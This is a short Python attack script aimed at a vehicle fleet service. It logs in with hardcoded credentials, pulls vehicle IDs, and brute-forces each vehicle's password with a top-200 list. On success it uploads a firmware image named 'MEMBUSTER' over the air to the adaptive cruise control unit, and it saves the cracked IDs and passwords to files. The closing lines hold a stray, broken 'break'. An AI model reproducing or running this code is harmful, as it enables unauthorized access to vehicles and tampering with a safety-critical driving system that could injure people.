import os

# Authenticate and retrieve vehicle ID
os.system('curl -s --insecure -m 60 "https://skyrator.fleet/user/login?user=eve.savage@skyrator.fleet&password=123456"')
os.system('curl -s --insecure -m 60 "https://skyrator.fleet/vehicle" -o vehicle_ID.txt')

# Process vehicle IDs and passwords
with open('vehicle_ID.txt', 'r') as f:
    IDS = f.readlines()

with open('top200passwords.txt', 'r') as f1:
    passwords = f1.readlines()

ids = []
ps = []

for ID in IDS:
    ID = ID.strip()
    success = False
    
    for password in passwords:
        password = password.strip()
        output = os.popen(f'curl -s --insecure -m 60 "https://skyrator.fleet/vehicle/{ID}/login?password={password}"').read()
        
        if 'Unauthorized' not in output:
            print(f'The vehicle ID is {ID} Password is: {password}')
            ids.append(ID)
            ps.append(password)
            os.system(f'curl -s --insecure -m 60 -X POST --data @FW_ACC_2_33_MEMBUSTER.img "https://skyrator.fleet/vehicle/{ID}/ota?ecu=ACC"')
            
            success = True
            break
                
    if success:
        break
    
    if len(ids) == 20:
        print(ids)
        print(ps)
        
        with open('vehicle_ids.txt', 'w') as idf:
            for i in ids:
                idf.write(i + '\n')
                
        with open('vehicle_ps.txt', 'w') as psf:
            for j in ps:
                psf.write(j + '\n')
                
        break
             break
